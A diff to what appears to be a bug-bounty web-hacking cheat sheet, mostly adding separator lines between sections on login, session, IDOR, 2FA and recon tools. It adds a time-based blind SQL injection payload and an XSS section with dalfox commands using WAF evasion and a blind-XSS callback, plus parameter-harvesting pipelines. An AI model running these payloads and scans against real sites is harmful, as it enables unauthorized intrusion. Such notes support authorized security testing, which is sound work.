@@ -20,6 +20,8 @@
     # rm subs.txt
 </details>
 
+-----------------------------------------------------------------------------
+
 <details> 
 ## <summary>signup vulnerabilities</summary>
     
@@ -55,6 +57,9 @@
     	 
 </details>
 
+-----------------------------------------------------------------------------
+
+
 <details>
 ## <summary>login vulnerabilities </summary>
 
@@ -77,6 +82,9 @@
 	 9- view source code of the page from CTRL+U to see if leaked credentials
 
  </details>
+
+-----------------------------------------------------------------------------
+
 
 
   <details>
@@ -106,6 +114,9 @@
      
     ```
 </details>
+
+-----------------------------------------------------------------------------
+
 
 <details>
 ## <summary>session vulnerabilities</summary>
@@ -154,6 +165,9 @@
 	
 </details>
 
+-----------------------------------------------------------------------------
+
+
 <details>
 	<summary>IDOR</summary>
 	
@@ -186,14 +200,23 @@
   
 </details>
 
+-----------------------------------------------------------------------------
+
+
 <details>
 	<summary>RCE</summary>
 </details>
+
+-----------------------------------------------------------------------------
+
 
 
 <details>
 	<summary>Broken Access Control</summary>
 </details>
+
+
+-----------------------------------------------------------------------------
 
 
 <details>
@@ -226,12 +249,18 @@
 		
 </details>
 
+-----------------------------------------------------------------------------
+
+
 <details>
 	<summary>Race Condition</summary>
 
     1- 
  
 </details>
+
+-----------------------------------------------------------------------------
+
 
 <details>
 	<summary>Rate Limit</summary>
@@ -276,6 +305,9 @@
 
 </details>
 
+-----------------------------------------------------------------------------
+
+
 <details>
 ## <summary>hacking WordPress</summary>
     
@@ -293,6 +325,9 @@
 
 </details>
 
+-----------------------------------------------------------------------------
+
+
 <details>
 ## <summary>Javascript Analysis</summary>
     
@@ -305,9 +340,15 @@
     # google.sh AIz.............
 </details>
 
+-----------------------------------------------------------------------------
+
+
 <details>
 	<summary>PHP</summary>
 </details>
+
+-----------------------------------------------------------------------------
+
 
 <details>
 	<summary>2FA</summary>
@@ -342,6 +383,9 @@
 	
 </details>
 
+-----------------------------------------------------------------------------
+
+
 
 <details>
 <summary>  Subdomain takeover </summary>
@@ -350,6 +394,9 @@
     if you found any vulnerability then search on how to takeover subdomain 
 </details>
     
+-----------------------------------------------------------------------------
+
+
   <details>       
 ## <summary>httpx</summary>
     
@@ -359,6 +406,9 @@
     1- use smuggler to check request smuggling vulnerablitiy 
     # cat httpx.txt | smuggler.py | tee -a smuggler.txt
 </details>
+
+-----------------------------------------------------------------------------
+
 
 <details>
 ## <summary>dirsearch and ffuf</summary>
@@ -377,6 +427,9 @@
     to fuzz in two places with two files 
     # ffuf -u https://mars.com/FUZZ/AGAIN  -w list1.txt:FUZZ  -w list2.txt:AGAIN
 </details>
+
+-----------------------------------------------------------------------------
+
 
 <details>
 ## <summary>Gather urls</summary>
@@ -399,6 +452,9 @@
  </details>   
     	
 
+-----------------------------------------------------------------------------
+
+
 
 <details>
 ## <summary>check sql injection in php</summary>
@@ -413,11 +469,38 @@
  </details>   
 
 
+-----------------------------------------------------------------------------
+
+
     
 <details>
-## <summary>sqlinjection</summary>
+## <summary>SQLI</summary>
 
     id = 1'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
 
 </details>
 
+
+-----------------------------------------------------------------------------
+
+<details>
+	<summary>XSS</summary>
+
+ 
+	
+	dalfox url "https://target.com/?q=search" -o dalfox_xss.txt
+	dalfox file allParam.txt --waf-evasion --user-agent 'Mozilla/5.0 (x11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 			Safari/537.36' --proxy 'http://127.0.0.1:8080' --timeout 30 -b 'payload from xss.report' -o xssProbability.txt --deep-domxss 
+	
+	
+	
+	
+	paramspider --domain domain.com
+	paramspider --domain https://www.domain.com --exclude woff,css,png,svg,jpg --output t.txt
+	
+	echo "sub.domain.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe
+	
+	
+	cat domain.txt | kxss | grep "\" ' < >" | tee kxss.txt
+	
+	cat domain.txt | kxss
+</details>
